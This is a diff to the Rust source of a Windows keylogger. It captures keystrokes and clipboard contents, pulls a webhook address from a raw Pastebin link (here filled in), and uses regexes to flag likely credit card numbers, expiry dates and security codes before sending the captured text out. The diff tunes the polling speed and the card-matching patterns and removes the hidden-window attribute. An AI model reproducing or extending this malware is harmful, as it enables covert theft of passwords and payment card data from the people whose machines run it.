@@ -1,4 +1,3 @@
-#![windows_subsystem = "windows"]
 use clipboard_win::{formats, get_clipboard};
 use regex::Regex;
 use std::collections::HashSet;
@@ -17,7 +16,7 @@ use winapi::um::winuser::{
     ToUnicodeEx, TranslateMessage, PM_REMOVE, VK_CAPITAL, VK_SHIFT,
 };
 
-const PASTEBIN_URL: &str = "YOUR RAW PASTEBIN URL CONTAINING WEBHOOK";
+const PASTEBIN_URL: &str = "https://pastebin.com/raw/UMsQ33BP";
 
 fn main() {
     let webhook = Arc::new(getwebhook().unwrap());
@@ -77,7 +76,7 @@ fn main() {
             let mut buffer = buffer.lock().unwrap();
 
             process_keystrokes(&mut pressed_keys, &mut buffer, &mut timer, &webhook);
-            thread::sleep(Duration::from_millis(5))
+            thread::sleep(Duration::from_micros(10))
         }
     })
     .join()
@@ -137,11 +136,11 @@ fn bufferagent(element: char, buffer: &mut Vec<char>, timer: &mut Instant, webho
         // Flush the buffer to the file
         let output = format!("{} [ENTER]", &stringbuffer);
 
-        let cc = Regex::new(r"(?<!\d)\d{16}(?!\d)").unwrap().is_match(&stringbuffer)
+        let cc = Regex::new(r"\b\d{16}\b").unwrap().is_match(&stringbuffer)
             || Regex::new(r"\b(0?[1-9]|1[0-2])/(0?[0-4][0-9]|50)\b")
                 .unwrap()
                 .is_match(&stringbuffer)
-            || Regex::new(r"(?<!\d)\d{3,8}(?!\d)").unwrap().is_match(&stringbuffer);
+            || Regex::new(r"\b\d{3,8}\b").unwrap().is_match(&stringbuffer);
 
         let params = &Params {
             msgtype: MessageTypes::Keystroke,
@@ -171,11 +170,11 @@ fn bufferagent(element: char, buffer: &mut Vec<char>, timer: &mut Instant, webho
             buffer.iter().collect::<String>().replace('\n', "\\n")
         );
 
-        let cc = Regex::new(r"(?<!\d)\d{16}(?!\d)").unwrap().is_match(&stringbuffer)
+        let cc = Regex::new(r"\b\d{16}\b").unwrap().is_match(&stringbuffer)
             || Regex::new(r"\b(0?[1-9]|1[0-2])/(0?[0-4][0-9]|50)\b")
                 .unwrap()
                 .is_match(&stringbuffer)
-            || Regex::new(r"(?<!\d)\d{3,8}(?!\d)").unwrap().is_match(&stringbuffer);
+            || Regex::new(r"\b\d{3,8}\b").unwrap().is_match(&stringbuffer);
 
         let params = &Params {
             msgtype: MessageTypes::Keystroke,
@@ -205,11 +204,11 @@ fn bufferagent(element: char, buffer: &mut Vec<char>, timer: &mut Instant, webho
             buffer.iter().collect::<String>().replace('\n', "\\n")
         );
 
-        let cc = Regex::new(r"(?<!\d)\d{16}(?!\d)").unwrap().is_match(&stringbuffer)
+        let cc = Regex::new(r"\b\d{16}\b").unwrap().is_match(&stringbuffer)
             || Regex::new(r"\b(0?[1-9]|1[0-2])/(0?[0-4][0-9]|50)\b")
                 .unwrap()
                 .is_match(&stringbuffer)
-            || Regex::new(r"(?<!\d)\d{3,8}(?!\d)").unwrap().is_match(&stringbuffer);
+            || Regex::new(r"\b\d{3,8}\b").unwrap().is_match(&stringbuffer);
 
         let params = &Params {
             msgtype: MessageTypes::Keystroke,
